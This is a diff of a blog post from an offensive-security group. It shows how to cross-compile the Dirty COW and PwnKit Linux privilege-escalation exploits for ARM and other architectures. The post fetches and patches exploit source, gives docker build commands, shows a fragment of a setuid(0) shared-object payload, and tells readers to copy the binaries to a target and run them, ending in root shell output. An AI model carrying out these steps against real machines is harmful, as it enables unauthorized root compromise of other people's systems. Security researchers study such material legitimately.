@@ -1,29 +1,29 @@
 
-### TL;DR: Use ```docker run muslcc/x86_64:armv6-linux-musleabi``` and ```gcc -static```.
+**TL;DR**: Use docker with the [muslcc toolchain](https://hub.docker.com/r/muslcc/x86_64/tags) and _gcc -static_.
 
 It is not always possible to compile an exploit on the target system. Here at THC we use various methods to cross-compile static Linux binaries. I'll explain some of our methods.
 
-Let's compile the exploit for [CVE-2016-5195](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5195) to run on Raspberry PI (armv6l) while our workstation is x86_64.
+Let's compile the exploit for [CVE-2016-5195](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5195) to run on Raspberry PI Linux (armv6l) while our workstation is MacOS (x86_64).
 
 The vulnerability is a local privilege escalation in Linux Kernel <4.8.3.
 
 ## Using muslcc toolchain
 
-The fine folks at https://musl.cc/ maintain cross-compiler toolchains for many different architectures. These toolschains can be used to generate a (static) Linux binary that will execute on a different architecture (armv6l) than the architecture that was used to compile the exploit (x86_64):
+The fine folks at https://musl.cc/ maintain cross-compiler toolchains for many different architectures. These toolchains can be used to generate a (static) Linux binary that will execute on a different architecture (armv6l) than the architecture for compiling the exploit (x86_64):
 
-There is a bug in the exploit. Let's download and fix this first:
+There is a bug in the reference exploit. Let's download and fix this first:
 ```shell
 mkdir thc; cd thc
 wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
-sed  -i 'sX.*= copy_file.*Xint ret = system("cp /etc/passwd\ /tmp/passwd.bak");X' dirty.c
+sed  -i 'sX.*= copy_file.*Xint ret = system("cp /etc/passwd /tmp/passwd.bak");X' dirty.c
 ```
 
-And now compile dirt.c for armv6:
+And now compile dirt.c for Linux with armv6 architecture on our MacOS (x84_64):
 ```shell
 docker run --rm -v $(pwd):/src -w /src muslcc/x86_64:armv6-linux-musleabi sh -c "gcc -pthread dirty.c -o dirty-exp -lcrypt -static"
 ```
 
-The `./dirty` binary will execute on the Raspberry PI with ARM6 architecture.
+The `./dirty` binary will execute on the Raspberry PI Linux (armv6l).
 
 ## Cross Compiling for 5 architectures
 
@@ -33,6 +33,8 @@ for arch in aarch64-linux-musl armv6-linux-musleabi mips-linux-muslsf mips64-lin
    docker run --rm -v $(pwd):/src -w /src muslcc/x86_64:${arch} sh -c "gcc -pthread dirty.c -o dirty-exp.${arch} -lcrypt -static"
 done
 ```
+
+Most architectures are _downward compatible_. This means an exploit compiled for arm6 will run fine on arm7 metal or i386 (from the 90s) still runs fine on x86_64.
 
 ```console
 $ ls -al dirty-exp.*
@@ -71,22 +73,21 @@ Some exploits can not be compiled statically.
 
 For example exploits that compile .so dynamic shared object files that need to be loaded by the vulnerable program. It is not possible to cross-compile them either as the .so files heavily depend on the ABI of the target system.
 
-### Using aarch64 or armv6
+### Targeting aarch64
 
-The assumption is that we can not compile on the target system. To compile we use a system with the same architecture and where the Linux flavour is as close as possible to the target system.
+The assumption is that we can not compile on the target system. Instead we use a system with the same architecture and where the Linux flavour is as close as possible to the target system.
 
-AWS has a good selection of Ubuntu, Red Hat, SuSE and Debian flavours and it is free to spin up a ARM64 (aarch64) t2.nano instance and compile an exploit. We also have a lab with various other architectures and flavours. That's what we do.
+AWS has a good selection flavours (Ubuntu, Red Hat, SuSE and Debian). It is free to spin up a ARM64 (aarch64) t2.nano instance to compile an exploit. We also have a lab with various other architectures and flavours. That's what we do.
 
 ### Compiling [CVE-2021-4034] for aarch64
 
 A good example is [CVE-2021-4034](https://github.com/arthepsy/CVE-2021-4034/) also known as polkit/pkexec exploit. The exploit compiles more source during runtime _and_ requires the vulnerable program to load the just compiled .so file.
 
-There are better exploits around but for what we like to showcase the reference exploit [cve-2021-4043-poc.c](https://github.com/arthepsy/CVE-2021-4034/blob/main/cve-2021-4034-poc.c) is just perfect.
+There are better exploits around but the reference exploit [cve-2021-4043-poc.c](https://github.com/arthepsy/CVE-2021-4034/blob/main/cve-2021-4034-poc.c) is just perfect for what we like to showcase.
 
-We modify the original exploit in two ways:
-1. We split it into two separate .c files.
-1. We copy the pre-compiled .so file instead of compiling it at runtime.
-
+We need to modify the original exploit in two ways:
+1. Split it into two separate .c files.
+1. Modify the source to copy the pre-compiled .so file instead of compiling it at runtime.
 
 thc-polkit.c
 ```C
@@ -107,7 +108,6 @@ pwnkit.c
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
-
 void gconv() {}
 void gconv_init() {
 	setuid(0); setgid(0);
@@ -122,6 +122,11 @@ gcc pwnkit.c -o pwnkit.so -shared -fPIC
 gcc thc-polkit.c -o thc-polkit -static
 ```
 
-Transfer to the target system and execute:
+Transfer `thc-polkit` and `pwnkit.so` to the target system and execute:
 ```console
 $ ./thc-polkit
+# id
+uid=0(root) gid=0(root) groups=0(root)
+#
+```
+
